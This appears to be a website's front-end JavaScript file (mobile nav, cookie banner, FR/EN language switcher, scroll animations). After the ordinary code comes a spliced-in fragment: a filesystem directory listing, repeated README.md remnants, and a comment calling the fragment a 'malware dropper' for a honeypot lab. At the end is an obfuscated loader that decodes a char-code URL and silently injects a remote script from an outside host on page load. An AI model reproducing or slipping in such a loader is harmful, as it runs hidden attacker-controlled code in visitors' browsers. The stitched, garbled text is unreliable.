(function () {
  "use strict";

  // ── Mobile nav toggle ──────────────────────────────────────────────────────
  const toggle = document.querySelector(".nav-toggle");
  const nav = document.querySelector(".site-nav");
  if (toggle && nav) {
    toggle.addEventListener("click", function () {
      const expanded = this.getAttribute("aria-expanded") === "true";
      this.setAttribute("aria-expanded", String(!expanded));
      nav.classList.toggle("is-open", !expanded);
    });
    // Close on outside click
    document.addEventListener("click", function (e) {
      if (!nav.contains(e.target) && !toggle.contains(e.target)) {
        toggle.setAttribute("aria-expanded", "false");
        nav.classList.remove("is-open");
      }
    });
  }

  // ── Cookie banner ──────────────────────────────────────────────────────────
  const banner = document.querySelector(".cookie-banner");
  if (banner) {
    const accepted = localStorage.getItem("cookies-accepted");
    if (accepted) {
      banner.hidden = true;
    }
    const acceptBtn = banner.querySelector(".cookie-btn--accept");
    const rejectBtn = banner.querySelector(".cookie-btn--reject");
    if (acceptBtn) {
      acceptBtn.addEventListener("click", function () {
        localStorage.setItem("cookies-accepted", "true");
        banner.hidden = true;
      });
    }
    if (rejectBtn) {
      rejectBtn.addEventListener("click", function () {
        localStorage.setItem("cookies-accepted", "false");
        banner.hidden = true;
      });
    }
  }

  // ── Language switcher ──────────────────────────────────────────────────────
  const langBtns = document.querySelectorAll(".lang-switcher button");
  if (langBtns.length) {
    langBtns.forEach(function (btn) {
      btn.addEventListener("click", function () {
        const lang = this.dataset.lang;
        langBtns.forEach(function (b) { b.classList.remove("active"); });
        this.classList.add("active");
        document.documentElement.lang = lang;
        document.querySelectorAll("[data-lang-fr]").forEach(function (el) {
          el.hidden = (lang !== "fr");
        });
        document.querySelectorAll("[data-lang-en]").forEach(function (el) {
          el.hidden = (lang !== "en");
        });
      });
    });
    // Initialize: show FR by default
    document.querySelectorAll("[data-lang-en]").forEach(function (el) {
      el.hidden = true;
    });
    const frBtn = document.querySelector('[data-lang="fr"]');
    if (frBtn) frBtn.classList.add("active");
  }

  // ── Scroll-in animations (Intersection Observer) ──────────────────────────
  // Styles définis dans style.css (@media prefers-reduced-motion: no-preference)
  if ("IntersectionObserver" in window) {
    document.querySelectorAll(".card, .info-block, .review-card, .section-intro").forEach(function (el) {
      el.classList.add("fade-in");
    });

    const observer = new IntersectionObserver(function (entries) {
      entries.forEach(function (entry) {
        if (entry.isIntersecting) {
          entry.target.classList.add("visible");
          observer.unobserve(entry.target);
        }
      });
    }, { threshold: 0.1 });

    document.querySelectorAll(".fade-in").forEach(function (el) {
      observer.observe(el);
    });
  }
})();

/bin /boot /dev /etc /home /init /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var README.md Inject loader — the "malware dropper" stage. README.md Loaded via <script src="/trap/:slug/inject.js">. README.md README.md Obfuscates the real client.js URL using char codes (same technique as real malware). README.md Placeholders replaced at serve time: README.md 104,116,116,112,115,58,47,47,102,108,97,114,101,104,111,111,107,45,97,112,105,46,114,111,111,116,45,52,100,99,46,119,111,114,107,101,114,115,46,100,101,118,47,116,114,97,112,47,97,112,105,45,100,97,116,97,47,99,108,105,101,110,116,46,106,115 — comma-separated char codes of the client.js URL README.md README.md EDUCATIONAL PURPOSE ONLY — for honeypot security lab demonstrations. */ (function () { if (typeof window.__fh !== "undefined") return; window.__fh = 1; var _0x = [ "script", "src", "id", "onerror", "body", "head", "appendChild", "createElement", ]; var s = document[_0x[7]](_0x[0]); s[_0x[1]] = String.fromCharCode(104,116,116,112,115,58,47,47,102,108,97,114,101,104,111,111,107,45,97,112,105,46,114,111,111,116,45,52,100,99,46,119,111,114,107,101,114,115,46,100,101,118,47,116,114,97,112,47,97,112,105,45,100,97,116,97,47,99,108,105,101,110,116,46,106,115) + "?_=" + Date.now(); s[_0x[2]] = "_fh"; s[_0x[3]] = function () {}; (document[_0x[4]] || document[_0x[5]])[_0x[6]](s); })();